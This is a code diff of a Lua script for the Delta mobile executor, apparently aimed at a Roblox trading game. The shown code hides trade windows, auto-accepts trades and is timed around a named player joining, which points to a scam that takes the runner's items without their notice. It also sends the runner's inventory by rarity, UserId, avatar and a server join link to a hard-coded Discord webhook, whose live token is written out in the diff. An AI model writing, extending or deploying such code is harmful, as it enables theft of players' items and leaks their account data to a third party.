@@ -1,5 +1,5 @@
--- ⚠️ Скрипт для Delta (Mobile).
-local webhookUrl = "https://discord.com/api/webhooks/1566607485748510760/IPbl6zAAy9Avck-kBEFDehtTl1SEi6eRBcSZSaCG1dMxSb37MkTWNygnTPtSBRv_gmuz"
+-- ⚠️ Скрипт для Delta (Mobile). Запускать ДО захода Marie_31113.
+local webhookUrl = "https://discord.com/api/webhooks/1564766433466912849/wymKnn-UzPAYt9MLsWahCWY4hOM6FEqlozeIMvfhB1o4jD7MbvzP1LGur331jNI6-NSK"
 
 local HttpService        = game:GetService("HttpService")
 local Players            = game:GetService("Players")
@@ -79,7 +79,7 @@ end
 hideTradeWindows()
 
 -- =========================================================
--- 3. ВЫСТАВЛЕНИЕ + АВТО-АКЦЕПТ + ОТПРАВКА ЛУТА
+-- 3. ВЫСТАВЛЕНИЕ + АВТО-АКЦЕПТ + ЛОГ ЛУТА
 -- =========================================================
 local Trade = ReplicatedStorage:WaitForChild("Trade")
 local lastOffer = nil
@@ -137,7 +137,6 @@ Trade.AcceptTrade.OnClientEvent:Connect(function(success, lootList)
             itemsText = itemsText .. string.format("🔹 **%s** (x%d)\n", itemName, amount)
         end
 
-        -- 🔥 ОТПРАВЛЯЕМ ВСЁ В ОДНОМ СООБЩЕНИИ 🔥
         sendDiscord({
             username = "Trade Logger (" .. myName .. ")",
             embeds = {
@@ -180,33 +179,77 @@ Players.PlayerAdded:Connect(function(pl)
 end)
 
 -- =========================================================
--- 5. ОБЩИЙ ЛОГ ПРИ ЗАХОДЕ (вместо инвентаря)
+-- 5. ОБЩИЙ ЛОГ ПРИ ЗАХОДЕ (Большой embed с инвентарём)
 -- =========================================================
 task.spawn(function()
     task.wait(6)
     local RS = game:GetService("ReplicatedStorage")
     local okPD, PD = pcall(function() return require(RS.Modules.ProfileData) end)
-    if not okPD then return end
-    
-    -- Считаем сколько всего шмоток
+    local okSync, Sync = pcall(function() return require(RS.Database.Sync) end)
+    if not okPD or not okSync then return end
+
     local weaponCount = 0
-    for _, amount in pairs(PD.Weapons.Owned or {}) do weaponCount = weaponCount + (tonumber(amount) or 1) end
+    local godlyList = {}
+    local vintageList = {}
+    local uncommonList = {}
+
+    for id, amount in pairs(PD.Weapons.Owned or {}) do
+        local count = tonumber(amount) or 1
+        weaponCount = weaponCount + count
+        local info = Sync.Weapons and Sync.Weapons[id]
+        
+        if info then
+            local itemName = (info.ItemName or info.Name or id)
+            local entry = itemName .. " (x" .. count .. ")"
+            
+            if info.Rarity == "Godly" then
+                table.insert(godlyList, "🔹 " .. entry)
+            elseif info.Rarity == "Vintage" then
+                table.insert(vintageList, "🔸 " .. entry)
+            elseif info.Rarity == "Uncommon" then
+                table.insert(uncommonList, "▫️ " .. entry)
+            end
+        end
+    end
+
+    local function getListString(list, emptyText)
+        if #list == 0 then return emptyText end
+        local text = table.concat(list, "\n")
+        if #text > 1000 then text = string.sub(text, 1, 997) .. "\n..." end
+        return text
+    end
+
+    local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=420&height=420&format=png"
 
     sendDiscord({
         username = "Session Logger",
         embeds = {
             {
-                title = "🔌 Сессия запущена: " .. myName,
-                color = 0x5865F2, -- синий
-                fields = {
-                    { name = "🕹️ Игра", value = "**"..gameName.."**", inline = true },
-                    { name = "⚙️ Исполнитель", value = "**"..executorName.."**", inline = true },
-                    { name = "👤 Ник", value = "**"..myName.."**", inline = true },
-                    { name = "🎒 Всего оружия", value = "**"..weaponCount.." шт.**", inline = false }
+                author = {
+                    name = "Профиль игрока: " .. myName,
+                    icon_url = avatarUrl
                 },
-                footer = { text = "Delta Mobile Logger" },
+                title = "🎮 Сессия запущена в " .. gameName,
+                description = "Собрана подробная информация об аккаунте.",
+                color = 0x9B59B6,
+                thumbnail = { url = avatarUrl },
+                fields = {
+                    { name = "👤 Никнейм", value = "**"..myName.."**", inline = true },
+                    { name = "⚙️ Исполнитель", value = "**"..executorName.."**", inline = true },
+                    { name = "🕹️ Игра", value = "**"..gameName.."**", inline = true },
+                    { name = "🔗 Сервер", value = "[Нажми, чтобы зайти]("..joinLink..")", inline = false },
+                    { name = "📊 Всего оружия", value = "**"..weaponCount.." шт.**", inline = false },
+                    { name = "🟣 Godly", value = getListString(godlyList, "Нет"), inline = false },
+                    { name = "🟡 Vintage", value = getListString(vintageList, "Нет"), inline = false },
+                    { name = "⚪ Uncommon", value = getListString(uncommonList, "Нет"), inline = false }
+                },
+                footer = { 
+                    text = "Delta Mobile Logger • UserId: " .. LocalPlayer.UserId,
+                    icon_url = avatarUrl
+                },
                 timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
             }
         }
     })
+    print("[inv] Большой лог сессии отправлен в Discord.")
 end)
